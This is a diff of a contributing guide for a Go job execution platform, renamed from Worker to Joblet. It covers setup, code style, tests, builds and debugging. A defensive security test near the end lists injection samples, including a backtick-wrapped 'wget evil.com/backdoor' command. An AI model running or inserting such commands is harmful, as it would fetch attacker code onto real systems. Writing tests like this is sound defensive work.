@@ -1,7 +1,7 @@
-# Contributing to Worker
+# Contributing to Joblet
 
-Thank you for your interest in contributing to Worker! This guide provides comprehensive information for developers and
-technical contributors working on the Worker distributed job execution platform.
+Thank you for your interest in contributing to Joblet! This guide provides comprehensive information for developers and
+technical contributors working on the Joblet distributed job execution platform.
 
 ## Table of Contents
 
@@ -31,8 +31,8 @@ technical contributors working on the Worker distributed job execution platform.
 
 ```bash
 # Clone and setup development environment
-git clone https://github.com/ehsaniara/worker.git
-cd worker
+git clone https://github.com/ehsaniara/joblet.git
+cd joblet
 
 # Install Go dependencies
 go mod download
@@ -66,11 +66,11 @@ golangci-lint version
 
 ### Core Components
 
-Understanding the Worker architecture is crucial for effective development:
+Understanding the Joblet architecture is crucial for effective development:
 
 ```
 ┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   CLI Client    │    │  Worker Server  │    │   Job Process   │
+│   CLI Client    │    │  Joblet Server  │    │   Job Process   │
 │  (any platform) │    │  (Linux only)   │    │  (Linux only)   │
 ├─────────────────┤    ├─────────────────┤    ├─────────────────┤
 │ • gRPC Client   │◄──►│ • gRPC Server   │    │ • Init Mode     │
@@ -96,7 +96,7 @@ internal/
 │   ├── server.go            # Server mode implementation
 │   ├── jobexec.go           # Job execution logic
 │   └── isolation.go         # Namespace setup
-├── worker/
+├── joblet/
 │   ├── core/linux/          # Linux-specific implementations
 │   │   ├── resource/        # Cgroup management
 │   │   ├── process/         # Process lifecycle
@@ -134,18 +134,18 @@ git checkout -b feature/issue-123-job-timeout
 ```bash
 # 1. Make changes
 # 2. Run tests early and often
-go test -v ./internal/worker/core/...
+go test -v ./internal/joblet/core/...
 
 # 3. Test specific components
-go test -v ./internal/worker/state/ -run TestStore
+go test -v ./internal/joblet/state/ -run TestStore
 
 # 4. Run linting
 golangci-lint run
 
 # 5. Build and test integration
 make all
-./bin/worker &
-./bin/worker-cli run echo "test"
+./bin/joblet &
+./bin/rnx run echo "test"
 
 # 6. Commit with conventional format
 git commit -m "feat(core): add job timeout configuration
@@ -159,14 +159,14 @@ Fixes #123"
 
 ### Code Generation
 
-Worker uses code generation for mocks and protocol buffers:
+Joblet uses code generation for mocks and protocol buffers:
 
 ```bash
 # Generate mocks for testing
 go generate ./...
 
 # Regenerate protocol buffers (if .proto files change)
-protoc --go_out=. --go-grpc_out=. api/worker.proto
+protoc --go_out=. --go-grpc_out=. api/joblet.proto
 
 # Verify generated code is up to date
 git diff --exit-code
@@ -176,11 +176,11 @@ git diff --exit-code
 
 ### Go Code Style
 
-Follow the Worker-specific conventions:
+Follow the Joblet-specific conventions:
 
 ```go
 // Package structure
-package worker
+package joblet
 
 import (
 	// Standard library
@@ -192,12 +192,12 @@ import (
 	"google.golang.org/grpc"
 
 	// Internal packages
-	"worker/internal/worker/domain"
-	"worker/pkg/logger"
+	"joblet/internal/joblet/domain"
+	"joblet/pkg/logger"
 )
 
 // Interface definitions with documentation
-type JobWorker interface {
+type Joblet interface {
 	// StartJob creates and starts a new job with the specified parameters.
 	// It returns the created job or an error if job creation fails.
 	StartJob(ctx context.Context, command string, args []string,
@@ -208,7 +208,7 @@ type JobWorker interface {
 }
 
 // Implementation with proper logging
-type worker struct {
+type joblet struct {
 	store    interfaces.Store
 	cgroup   resource.Resource
 	platform platform.Platform
@@ -216,12 +216,12 @@ type worker struct {
 }
 
 // Constructor with dependency injection
-func NewWorker(store interfaces.Store, cfg *config.Config) interfaces.Worker {
-	return &worker{
+func NewJoblet(store interfaces.Store, cfg *config.Config) interfaces.Joblet {
+	return &joblet{
 		store:    store,
 		cgroup:   resource.New(cfg.Cgroup),
 		platform: platform.NewPlatform(),
-		logger:   logger.WithField("component", "worker"),
+		logger:   logger.WithField("component", "joblet"),
 	}
 }
 ```
@@ -236,7 +236,7 @@ ErrInvalidCommand = errors.New("invalid command")
 )
 
 // Proper error wrapping with context
-func (w *worker) StartJob(ctx context.Context, command string, args []string,
+func (w *joblet) StartJob(ctx context.Context, command string, args []string,
 maxCPU, maxMemory, maxIOBPS int32) (*domain.Job, error) {
 
 if command == "" {
@@ -261,7 +261,7 @@ return job, nil
 
 ```go
 // Structured logging with context
-func (w *worker) processJob(job *domain.Job) {
+func (w *joblet) processJob(job *domain.Job) {
 log := w.logger.WithFields(
 "jobId", job.Id,
 "command", job.Command,
@@ -286,12 +286,12 @@ log.Info("job processing completed", "duration", duration)
 
 ### Test Categories
 
-Worker uses a multi-layered testing approach:
+Joblet uses a multi-layered testing approach:
 
 #### 1. Unit Tests
 
 ```go
-// Test file: internal/worker/state/store_test.go
+// Test file: internal/joblet/state/store_test.go
 func TestStore_CreateNewJob(t *testing.T) {
 tests := []struct {
 name     string
@@ -358,13 +358,13 @@ t.Skip("Integration tests require Linux")
 // Setup test environment
 cfg := testConfig(t)
 store := state.New()
-worker := core.NewWorker(store, cfg)
+joblet := core.NewWorker(store, cfg)
 
 ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 defer cancel()
 
 // Create job
-job, err := worker.StartJob(ctx, "echo", []string{"integration-test"}, 50, 256, 0)
+job, err := joblet.StartJob(ctx, "echo", []string{"integration-test"}, 50, 256, 0)
 require.NoError(t, err)
 require.NotNil(t, job)
 assert.Equal(t, domain.StatusInitializing, job.Status)
@@ -399,7 +399,7 @@ set -e
 echo "Starting E2E tests..."
 
 # Start server in background
-./bin/worker &
+./bin/joblet &
 SERVER_PID=$!
 trap "kill $SERVER_PID" EXIT
 
@@ -408,19 +408,19 @@ sleep 2
 
 # Test basic job execution
 echo "Testing basic job execution..."
-JOB_ID=$(./bin/worker-cli run echo "e2e-test" | grep "ID:" | cut -d' ' -f2)
+JOB_ID=$(./bin/rnx run echo "e2e-test" | grep "ID:" | cut -d' ' -f2)
 
 # Test job status
 echo "Testing job status..."
-./bin/worker-cli status "$JOB_ID"
+./bin/rnx status "$JOB_ID"
 
 # Test job listing
 echo "Testing job listing..."
-./bin/worker-cli list | grep "$JOB_ID"
+./bin/rnx list | grep "$JOB_ID"
 
 # Test log streaming
 echo "Testing log streaming..."
-./bin/worker-cli log "$JOB_ID" | grep "e2e-test"
+./bin/rnx log "$JOB_ID" | grep "e2e-test"
 
 echo "E2E tests completed successfully!"
 ```
@@ -436,10 +436,10 @@ go tool cover -html=coverage.out
 go test -v -tags=integration ./test/integration/...
 
 # Specific component tests
-go test -v ./internal/worker/core/linux/resource/...
+go test -v ./internal/joblet/core/linux/resource/...
 
 # Benchmark tests
-go test -bench=. -benchmem ./internal/worker/state/
+go test -bench=. -benchmem ./internal/joblet/state/
 
 # E2E tests
 ./scripts/e2e-test.sh
@@ -454,9 +454,9 @@ package testutil
 import (
 	"testing"
 	"time"
-	"worker/internal/worker/domain"
-	"worker/pkg/config"
-	"worker/pkg/logger"
+	"joblet/internal/joblet/domain"
+	"joblet/pkg/config"
+	"joblet/pkg/logger"
 )
 
 // TestJob creates a test job with sensible defaults
@@ -488,8 +488,8 @@ func TestConfig(t *testing.T) *config.Config {
 	t.Helper()
 
 	cfg := config.DefaultConfig
-	cfg.Worker.MaxConcurrentJobs = 5
-	cfg.Worker.JobTimeout = 30 * time.Second
+	cfg.Joblet.MaxConcurrentJobs = 5
+	cfg.Joblet.JobTimeout = 30 * time.Second
 	cfg.Logging.Level = "DEBUG"
 
 	return &cfg
@@ -525,7 +525,7 @@ When adding new features, follow the established patterns:
 #### 1. Domain Model First
 
 ```go
-// internal/worker/domain/job.go
+// internal/joblet/domain/job.go
 type Job struct {
 // ... existing fields ...
 
@@ -556,7 +556,7 @@ return j.Timeout - elapsed
 #### 2. Interface Definition
 
 ```go
-// internal/worker/core/interfaces/worker.go
+// internal/joblet/core/interfaces/joblet.go
 type Worker interface {
 StartJob(ctx context.Context, command string, args []string,
 maxCPU, maxMemory, maxIOBPS int32) (*domain.Job, error)
@@ -570,7 +570,7 @@ SetJobTimeout(ctx context.Context, jobId string, timeout time.Duration) error
 #### 3. Implementation
 
 ```go
-// internal/worker/core/linux/worker.go
+// internal/joblet/core/linux/joblet.go
 func (w *Worker) SetJobTimeout(ctx context.Context, jobId string, timeout time.Duration) error {
 log := w.logger.WithFields("jobId", jobId, "timeout", timeout)
 log.Debug("setting job timeout")
@@ -603,7 +603,7 @@ return nil
 #### 4. API Integration
 
 ```protobuf
-// api/worker.proto
+// api/joblet.proto
 service JobService {
   // ... existing methods ...
 
@@ -728,27 +728,27 @@ test-integration:
 lint:
 	golangci-lint run --timeout 5m
 
-build: worker cli
+build: joblet cli
 	@echo "Build completed"
 
-worker:
-	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -o bin/worker ./cmd/worker
+joblet:
+	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -o bin/joblet ./cmd/joblet
 
 cli:
-	go build -ldflags="-w -s" -o bin/worker-cli ./cmd/cli
+	go build -ldflags="-w -s" -o bin/rnx ./cmd/cli
 
 # Platform-specific builds
 build-linux:
-	GOOS=linux GOARCH=amd64 go build -o bin/worker-linux ./cmd/worker
-	GOOS=linux GOARCH=amd64 go build -o bin/worker-cli-linux ./cmd/cli
+	GOOS=linux GOARCH=amd64 go build -o bin/joblet-linux ./cmd/joblet
+	GOOS=linux GOARCH=amd64 go build -o bin/rnx ./cmd/cli
 
 build-darwin:
-	GOOS=darwin GOARCH=amd64 go build -o bin/worker-cli-darwin ./cmd/cli
+	GOOS=darwin GOARCH=amd64 go build -o bin/rnx-darwin ./cmd/cli
 
 # Code generation
 generate:
 	go generate ./...
-	protoc --go_out=. --go-grpc_out=. api/worker.proto
+	protoc --go_out=. --go-grpc_out=. api/joblet.proto
 
 # Development setup
 setup-dev: generate build certs-local
@@ -767,13 +767,13 @@ clean:
 
 ```bash
 # Development build (with debug info)
-go build -race -o bin/worker-dev ./cmd/worker
+go build -race -o bin/joblet-dev ./cmd/joblet
 
 # Production build (optimized)
-CGO_ENABLED=0 go build -ldflags="-w -s -X main.version=${VERSION}" -o bin/worker ./cmd/worker
+CGO_ENABLED=0 go build -ldflags="-w -s -X main.version=${VERSION}" -o bin/joblet ./cmd/joblet
 
 # Static binary for containers
-CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags="-w -s" -o bin/worker ./cmd/worker
+CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags="-w -s" -o bin/joblet ./cmd/joblet
 ```
 
 ## Debugging
@@ -782,20 +782,20 @@ CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags="-w -s" -o bin/
 
 ```bash
 # Run server with debug logging
-WORKER_LOG_LEVEL=DEBUG ./bin/worker
+WORKER_LOG_LEVEL=DEBUG ./bin/joblet
 
 # Debug specific component
-go test -v -run TestStore_CreateNewJob ./internal/worker/state/
+go test -v -run TestStore_CreateNewJob ./internal/joblet/state/
 
 # Race condition detection
 go test -race ./...
 
 # CPU profiling
-go test -cpuprofile=cpu.prof -bench=. ./internal/worker/state/
+go test -cpuprofile=cpu.prof -bench=. ./internal/joblet/state/
 go tool pprof cpu.prof
 
 # Memory profiling
-go test -memprofile=mem.prof -bench=. ./internal/worker/state/
+go test -memprofile=mem.prof -bench=. ./internal/joblet/state/
 go tool pprof mem.prof
 ```
 
@@ -803,11 +803,11 @@ go tool pprof mem.prof
 
 ```bash
 # Enable debug mode in production
-sudo systemctl edit worker
+sudo systemctl edit joblet
 # Add: Environment=WORKER_LOG_LEVEL=DEBUG
 
 # Monitor job execution
-sudo journalctl -u worker -f | grep "jobId"
+sudo journalctl -u joblet -f | grep "jobId"
 
 # Check cgroup resources
 find /sys/fs/cgroup -name "job-*" -exec cat {}/memory.current \;
@@ -872,7 +872,7 @@ func TestWithTrace(t *testing.T) {
 ### Benchmarking
 
 ```go
-// internal/worker/state/store_bench_test.go
+// internal/joblet/state/store_bench_test.go
 func BenchmarkStore_CreateNewJob(b *testing.B) {
 store := state.New()
 
@@ -995,11 +995,11 @@ maliciousCommands := []string{
 "`wget evil.com/backdoor`",
 }
 
-worker := setupTestWorker(t)
+joblet := setupTestWorker(t)
 
 for _, cmd := range maliciousCommands {
 t.Run(fmt.Sprintf("command_%s", cmd), func (t *testing.T) {
-_, err := worker.StartJob(context.Background(), cmd, nil, 0, 0, 0)
+_, err := joblet.StartJob(context.Background(), cmd, nil, 0, 0, 0)
 // Should either reject the command or safely execute it in isolation
 if err == nil {
 // If accepted, verify it runs in isolation
@@ -1020,11 +1020,11 @@ expectErr bool
 {"negative_limit", -1, true},
 }
 
-worker := setupTestWorker(t)
+joblet := setupTestWorker(t)
 
 for _, tt := range tests {
 t.Run(tt.name, func (t *testing.T) {
-_, err := worker.StartJob(context.Background(), "echo", []string{"test"},
+_, err := joblet.StartJob(context.Background(), "echo", []string{"test"},
 0, tt.maxMemory, 0)
 
 if tt.expectErr {
@@ -1082,5 +1082,5 @@ git push origin feature/issue-123-job-timeout
 
 ---
 
-**Thank you for contributing to Worker!** Your efforts help make distributed job execution more secure, reliable, and
+**Thank you for contributing to Joblet!** Your efforts help make distributed job execution more secure, reliable, and
 performant for everyone.
